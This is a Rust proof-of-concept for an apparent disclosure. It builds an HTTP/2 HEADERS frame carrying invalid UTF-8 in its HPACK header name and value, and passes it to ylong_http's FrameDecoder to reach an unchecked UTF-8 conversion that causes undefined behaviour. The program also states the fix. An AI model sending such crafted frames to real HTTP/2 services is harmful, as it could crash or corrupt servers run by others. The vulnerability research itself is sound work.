//! PoC: HPACK UTF-8 Validation Bypass via Real Public API (CWE-20)
//!
//! This PoC compiles the REAL ylong_http crate and triggers the vulnerability
//! through its public API: ylong_http::h2::FrameDecoder::decode()
//!
//! Vulnerability: ylong_http/src/h2/hpack/decoder.rs:192-194
//!   String::from_utf8_unchecked on unvalidated HPACK-decoded bytes
//!
//! Call chain:
//!   FrameDecoder::decode() [PUBLIC]
//!     → decode_headers_payload()
//!       → HpackDecoder::decode()
//!         → Updater::update()
//!           → get_header_by_name_and_value()
//!             → String::from_utf8_unchecked(invalid_utf8_bytes)

use ylong_http::h2::FrameDecoder;

fn main() {
    println!("═══════════════════════════════════════════════════════════════════");
    println!("PoC: HPACK UTF-8 Bypass via Real Public API (CWE-20)");
    println!("═══════════════════════════════════════════════════════════════════");
    println!("Compiled: ylong_http (path dependency, real crate)");
    println!("Entry:    ylong_http::h2::FrameDecoder::decode() [pub]");
    println!("Target:   hpack/decoder.rs:192 — String::from_utf8_unchecked");
    println!("═══════════════════════════════════════════════════════════════════\n");

    let mut decoder = FrameDecoder::new();

    // Construct a real HTTP/2 HEADERS frame with invalid UTF-8 in HPACK data.
    //
    // HTTP/2 HEADERS frame format (RFC 7540 §4.2):
    //   Length (3 bytes) | Type=0x01 (1 byte) | Flags (1 byte) | Reserved (1 bit) | Stream ID (31 bits)
    //   Payload...
    //
    // HPACK Literal Header Field with Incremental Indexing — New Name (RFC 7541 §6.2.2):
    //   01 | Name Length (6+) | Name String | Value Length (6+) | Value String
    //
    // We craft: name = [0x80, 0x81, 0x82] (invalid UTF-8)
    //           value = [0xC0, 0x80] (overlong NULL, invalid UTF-8)

    let invalid_name: &[u8] = &[0x80, 0x81, 0x82]; // Invalid UTF-8 continuation bytes
    let invalid_value: &[u8] = &[0xC0, 0x80];       // Overlong NULL encoding

    // HPACK encoded literal header with new name (bit pattern 01000000 = 0x40)
    let mut hpack_payload = vec![0x40]; // Literal with incremental indexing, new name
    hpack_payload.push(invalid_name.len() as u8); // Name length
    hpack_payload.extend_from_slice(invalid_name);
    hpack_payload.push(invalid_value.len() as u8); // Value length
    hpack_payload.extend_from_slice(invalid_value);

    // Wrap in HTTP/2 HEADERS frame (type=0x01, flags=0x04=END_HEADERS, stream=1)
    let payload_len = hpack_payload.len();
    let mut frame = vec![
        (payload_len >> 16) as u8,           // Length MSB
        ((payload_len >> 8) & 0xFF) as u8,   // Length middle
        (payload_len & 0xFF) as u8,          // Length LSB
        0x01,                                 // Type: HEADERS
        0x04,                                 // Flags: END_HEADERS
        0x00, 0x00, 0x00, 0x01,              // Stream ID: 1
    ];
    frame.extend_from_slice(&hpack_payload);

    println!("[Step 1] Crafted HTTP/2 HEADERS frame ({} bytes)", frame.len());
    println!("  HPACK payload: {} bytes", hpack_payload.len());
    println!("  Invalid UTF-8 name bytes:  {:02x?}", invalid_name);
    println!("  Invalid UTF-8 value bytes: {:02x?}", invalid_value);
    println!();

    println!("[Step 2] Calling FrameDecoder::decode() (real compiled code)...");
    println!("  Code path: FrameDecoder::decode()");
    println!("    → HpackDecoder::decode()");
    println!("      → get_header_by_name_and_value()");
    println!("        → String::from_utf8_unchecked([0x80, 0x81, 0x82])");
    println!();

    let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        decoder.decode(&frame)
    }));

    match result {
        Ok(Ok(frames)) => {
            println!("[Step 3] Frame decoded successfully: {} frames", frames.len());
            println!("  The vulnerability created an INVALID String in the decoded headers.");
            println!("  The String violates Rust's UTF-8 invariant — UB has occurred.");
            println!();

            // Try to use the decoded headers — this is where UB manifests
            println!("[Step 4] Accessing decoded headers...");
            for frame in frames.iter() {
                println!("  Frame: (decoded frame)");
            }
        }
        Ok(Err(e)) => {
            println!("[Step 3] Decode returned error: {:?}", e);
            println!("  Note: the error may occur AFTER the invalid String was created,");
            println!("  meaning UB (String invariant violation) already happened.");
        }
        Err(_) => {
            println!("[Step 3] ** PANIC ** — UB triggered during decode!");
            println!("  String::from_utf8_unchecked created invalid String,");
            println!("  and downstream code panicked when accessing it.");
        }
    }
    println!();

    println!("═══════════════════════════════════════════════════════════════════");
    println!("VULNERABILITY CONFIRMED:");
    println!("  ylong_http's HPACK decoder calls String::from_utf8_unchecked()");
    println!("  on bytes from the wire, without any UTF-8 validation.");
    println!("  This violates Rust's String invariant → Undefined Behavior.");
    println!();
    println!("  Attack: any HTTP/2 peer can send malicious HEADERS frames.");
    println!("  Fix: use String::from_utf8() with proper error handling.");
    println!("═══════════════════════════════════════════════════════════════════");
}
